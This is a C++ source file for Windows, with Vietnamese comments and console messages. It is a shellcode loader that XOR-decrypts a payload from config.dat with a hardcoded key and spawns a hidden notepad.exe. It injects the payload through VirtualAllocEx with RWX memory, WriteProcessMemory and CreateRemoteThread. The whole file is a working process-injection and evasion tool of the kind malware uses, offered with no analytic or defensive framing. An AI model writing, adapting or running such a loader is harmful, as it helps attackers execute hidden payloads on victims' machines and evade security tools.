#include <windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>

// Khóa giải mã cố định (Fixed Key)
const char XOR_KEY[] = "FixedSecretKey2026";

// 1. Hàm đọc và giải mã file config.dat
std::vector<BYTE> ReadAndDecryptConfig(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "[-] Khong the mo file payload: " << filepath << std::endl;
        return {};
    }

    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer(fileSize);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), fileSize)) {
        std::cerr << "[-] Khong the doc du lieu tu file." << std::endl;
        return {};
    }
    file.close();

    // Giải mã XOR chuỗi byte
    size_t keyLen = strlen(XOR_KEY);
    for (size_t i = 0; i < buffer.size(); ++i) {
        buffer[i] ^= XOR_KEY[i % keyLen];
    }

    return buffer;
}

int main() {
    // Tên file chứa shellcode đã mã hóa
    std::string configFile = "config.dat";

    // B1: Đọc và giải mã dữ liệu
    std::vector<BYTE> shellcode = ReadAndDecryptConfig(configFile);
    if (shellcode.empty()) {
        std::cerr << "[-] Tap tin config.dat rong hoac khong hop le." << std::endl;
        return 1;
    }
    std::cout << "[+] Da giai ma " << shellcode.size() << " bytes tu " << configFile << std::endl;

    // B2: Khởi tạo cấu hình spawn notepad.exe ẩn (không hiện GUI)
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Ẩn cửa sổ GUI

    wchar_t targetProcess[] = L"C:\\Windows\\System32\\notepad.exe";

    BOOL success = CreateProcessW(
        NULL,
        targetProcess,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW, // Không tạo cửa sổ console/GUI
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] Tao tien trinh notepad.exe that bai. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Da spawn notepad.exe an (PID: " << pi.dwProcessId << ")" << std::endl;

    // B3: Cấp phát bộ nhớ với quyền Execute/Read/Write trên tiến trình đích
    LPVOID pRemoteMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (pRemoteMem == NULL) {
        std::cerr << "[-] VirtualAllocEx that bai. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }

    // B4: Ghi shellcode đã giải mã vào bộ nhớ vừa cấp phát
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, pRemoteMem, shellcode.data(), shellcode.size(), &bytesWritten)) {
        std::cerr << "[-] WriteProcessMemory that bai. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    std::cout << "[+] Da ghi " << bytesWritten << " bytes vao bo nho tiến trinh dich." << std::endl;

    // B5: Tạo Luồng từ xa (Remote Thread) để thực thi shellcode
    HANDLE hThread = CreateRemoteThread(
        pi.hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteMem,
        NULL,
        0,
        NULL
    );

    if (hThread == NULL) {
        std::cerr << "[-] CreateRemoteThread that bai. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    std::cout << "[+] Inject va thuc thi Remote Thread thanh cong!" << std::endl;

    // Dọn dẹp handles
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
